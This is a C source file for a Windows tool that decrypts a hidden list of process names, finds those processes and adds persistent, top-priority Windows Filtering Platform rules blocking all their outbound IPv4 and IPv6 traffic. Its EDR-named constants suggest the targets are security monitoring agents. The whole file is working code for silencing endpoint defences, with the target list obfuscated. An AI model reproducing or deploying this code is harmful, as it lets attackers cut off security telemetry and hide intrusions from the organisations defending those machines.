#include <winsock2.h>
#include <initguid.h>
#include <fwpmu.h>
#include "core.h"
#include "errors.h"
#include <strsafe.h>

// Helper prototypes
static DWORD AddProviderAndSubLayer(HANDLE hEngine);
static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath);
static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath);

void configureNetworkFilters() {
    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
    HANDLE hEngine = NULL;
    if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
    if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }
    
    char** decryptedNames = (char**)HeapAlloc(g_hHeap, HEAP_ZERO_MEMORY, PROCESS_DATA_COUNT * sizeof(char*));
    if (!decryptedNames) { FwpmEngineClose0(hEngine); return; }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { decryptedNames[i] = decryptString(processData[i]); }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
                    if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
                        PRINTF("[+] Found target process: %s\n", pe32.szExeFile);
                        WCHAR fullPath[MAX_PATH];
                        if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
                            ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, fullPath);
                        }
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) { if (decryptedNames[i]) HeapFree(g_hHeap, 0, decryptedNames[i]); }
    HeapFree(g_hHeap, 0, decryptedNames);
    FwpmEngineClose0(hEngine);
}

void addProcessRule(const char* processPath) {
    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
    HANDLE hEngine = NULL;
    if (FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine) != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", GetLastError()); return; }
    if (AddProviderAndSubLayer(hEngine) != ERROR_SUCCESS) { FwpmEngineClose0(hEngine); return; }

    wchar_t processPathW[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, processPathW, MAX_PATH) == 0) {
        PrintDetailedError("Failed to convert process path", GetLastError());
    } else {
        ApplyGenericBlockFilterForPath(hEngine, &SubLayerGUID, processPathW);
    }
    FwpmEngineClose0(hEngine);
}

void removeAllRules() {
    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) { PrintDetailedError("FwpmEngineOpen0 failed", result); return; }

    PRINTF("[+] Starting comprehensive cleanup...\n");

    HANDLE enumHandle = NULL;
    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = {0};
    enumTemplate.providerKey = (GUID*)&ProviderGUID;
    
    result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
    if (result == ERROR_SUCCESS) {
        FWPM_FILTER0** filters = NULL;
        UINT32 numEntries = 0;
        result = FwpmFilterEnum0(hEngine, enumHandle, 0xFFFFFFFF, &filters, &numEntries);
        if (result == ERROR_SUCCESS && numEntries > 0) {
            PRINTF("[+] Removing %u filter(s)...\n", numEntries);
            for (UINT32 i = 0; i < numEntries; i++) {
                FwpmFilterDeleteById0(hEngine, filters[i]->filterId);
            }
            FwpmFreeMemory0((void**)&filters);
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    }

    result = FwpmSubLayerDeleteByKey0(hEngine, &SubLayerGUID);
    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP sublayer removed successfully.\n"); }
    else if ((long)result != FWP_E_SUBLAYER_NOT_FOUND) { PrintDetailedError("FwpmSubLayerDeleteByKey0 failed", result); }

    result = FwpmProviderDeleteByKey0(hEngine, &ProviderGUID);
    if (result == ERROR_SUCCESS) { PRINTF("[+] WFP provider removed successfully.\n"); }
    else if ((long)result != FWP_E_PROVIDER_NOT_FOUND) { PrintDetailedError("FwpmProviderDeleteByKey0 failed", result); }

    FwpmEngineClose0(hEngine);
    PRINTF("[+] Cleanup complete.\n");
}

static void ApplyGenericBlockFilterForPath(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    if (CustomFwpmGetAppIdFromFileName0(fullPath, &appId) != CUSTOM_SUCCESS) { return; }
    BOOL ipv4Exists = FilterExists(hEngine, &FWPM_LAYER_ALE_AUTH_CONNECT_V4, appId, EDR_FILTER_NAME);
    if (ipv4Exists) {
        WPRINTF(L"    [!] Generic block filter for %s already exists. Skipping.\n", fullPath);
        FreeAppId(appId);
        return;
    }
    
    DWORD result = FwpmTransactionBegin0(hEngine, 0);
    if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionBegin0 failed", result); FreeAppId(appId); return; }
    
    FWPM_FILTER0 blockFilter = {0};
    blockFilter.providerKey = (GUID*)&ProviderGUID;
    blockFilter.subLayerKey = *subLayerGuid;
    blockFilter.action.type = FWP_ACTION_BLOCK;
    blockFilter.displayData.name = EDR_FILTER_NAME;
    blockFilter.weight.type = FWP_UINT8;
    blockFilter.weight.uint8 = 0xF;
    
    FWPM_FILTER_CONDITION0 condition = {0};
    blockFilter.filterCondition = &condition;
    blockFilter.numFilterConditions = 1;
    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = appId;

    UINT64 filterId = 0;
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv4).\n", fullPath, filterId); }
    
    blockFilter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
    result = FwpmFilterAdd0(hEngine, &blockFilter, NULL, &filterId);
    if (result == ERROR_SUCCESS) { WPRINTF(L"    [+] Generic block filter added for %s (ID: %llu, IPv6).\n", fullPath, filterId); }

    result = FwpmTransactionCommit0(hEngine);
    if (result != ERROR_SUCCESS) { PrintDetailedError("Generic FwpmTransactionCommit0 failed", result); FwpmTransactionAbort0(hEngine); }
    FreeAppId(appId);
}
static DWORD AddProviderAndSubLayer(HANDLE hEngine) {
    DWORD result = FwpmTransactionBegin0(hEngine, 0);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionBegin0 failed", result);
        return result;
    }

    FWPM_PROVIDER0 provider = { 0 };
    provider.providerKey = ProviderGUID;
    provider.displayData.name = EDR_PROVIDER_NAME;
    provider.displayData.description = EDR_PROVIDER_DESCRIPTION;
    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;
    result = FwpmProviderAdd0(hEngine, &provider, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        PrintDetailedError("FwpmProviderAdd0 failed", result);
        FwpmTransactionAbort0(hEngine);
        return result;
    }

    FWPM_SUBLAYER0 subLayer = { 0 };
    subLayer.subLayerKey = SubLayerGUID;
    subLayer.displayData.name = EDR_SUBLAYER_NAME;
    subLayer.displayData.description = EDR_SUBLAYER_DESCRIPTION;
    subLayer.providerKey = (GUID*)&ProviderGUID;
    subLayer.weight = 0xFFFF; // MAX WEIGHT
    subLayer.flags = FWPM_SUBLAYER_FLAG_PERSISTENT;
    result = FwpmSubLayerAdd0(hEngine, &subLayer, NULL);
    if (result != ERROR_SUCCESS && (long)result != FWP_E_ALREADY_EXISTS) {
        PrintDetailedError("FwpmSubLayerAdd0 failed", result);
        FwpmTransactionAbort0(hEngine);
        return result;
    }

    result = FwpmTransactionCommit0(hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmTransactionCommit0 failed", result);
    }

    return result;
}

static void RemoveFiltersForProcess(HANDLE hEngine, PCWSTR fullPath) {
    FWP_BYTE_BLOB* appId = NULL;
    DWORD result = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);
    if (result != CUSTOM_SUCCESS) {
        PrintDetailedError("Failed to get AppID for process to remove", result);
        return;
    }

    const GUID* layers[] = { &FWPM_LAYER_ALE_AUTH_CONNECT_V4, &FWPM_LAYER_ALE_AUTH_CONNECT_V6, &FWPM_LAYER_OUTBOUND_TRANSPORT_V4, &FWPM_LAYER_OUTBOUND_TRANSPORT_V6 };
    UINT totalRemoved = 0;

    FWPM_FILTER_CONDITION0 condition = { 0 };
    condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    condition.matchType = FWP_MATCH_EQUAL;
    condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
    condition.conditionValue.byteBlob = appId;

    for (int i = 0; i < 4; ++i) {
        HANDLE enumHandle = NULL;
        FWPM_FILTER0** ppFilters = NULL;
        UINT32 numEntries = 0;

        FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate = { 0 };
        enumTemplate.providerKey = (GUID*)&ProviderGUID;
        enumTemplate.layerKey = *layers[i];
        enumTemplate.numFilterConditions = 1;
        enumTemplate.filterCondition = &condition;
        
        result = FwpmFilterCreateEnumHandle0(hEngine, &enumTemplate, &enumHandle);
        if (result != ERROR_SUCCESS) {
            continue;
        }

        result = FwpmFilterEnum0(hEngine, enumHandle, (UINT32)-1, &ppFilters, &numEntries);
        if (result == ERROR_SUCCESS && numEntries > 0) {
            for (UINT32 j = 0; j < numEntries; j++) {
                if (FwpmFilterDeleteById0(hEngine, ppFilters[j]->filterId) == ERROR_SUCCESS) {
                    totalRemoved++;
                }
            }
            FwpmFreeMemory0((void**)&ppFilters);
        }
        FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);
    }

    if (totalRemoved > 0) {
        WPRINTF(L"[+] Found and removed %u rule(s) for %s\n", totalRemoved, fullPath);
    } else {
        WPRINTF(L"[!] No matching rules found for %s\n", fullPath);
    }

    FreeAppId(appId);
}

void removeRulesByPath(const char* processPath) {
    if (!EnableSeDebugPrivilege()) {
        EPRINTF("[-] Failed to enable SeDebugPrivilege. This is required to remove rules.\n");
        return;
    }

    wchar_t wProcessPath[MAX_PATH];
    if (MultiByteToWideChar(CP_ACP, 0, processPath, -1, wProcessPath, MAX_PATH) == 0) {
        EPRINTF("[-] Failed to convert process path to wide string.\n");
        return;
    }

    HANDLE hEngine = NULL;
    DWORD result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    PRINTF("[+] Attempting to remove all filters for process: %s\n", processPath);
    RemoveFiltersForProcess(hEngine, wProcessPath);

    FwpmEngineClose0(hEngine);
}

void removeRuleById(UINT64 ruleId) {
    HANDLE hEngine = NULL;
    DWORD result = 0;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &hEngine);
    if (result != ERROR_SUCCESS) {
        PrintDetailedError("FwpmEngineOpen0 failed", result);
        return;
    }

    result = FwpmFilterDeleteById0(hEngine, ruleId);
    if (result == ERROR_SUCCESS) {
        PRINTF("[+] Successfully removed rule with ID %llu.\n", ruleId);
    } else {
        char contextBuffer[128];
        StringCchPrintfA(contextBuffer, 128, "Failed to remove rule with ID %llu", ruleId);
        PrintDetailedError(contextBuffer, result);
    }

    FwpmEngineClose0(hEngine);
}

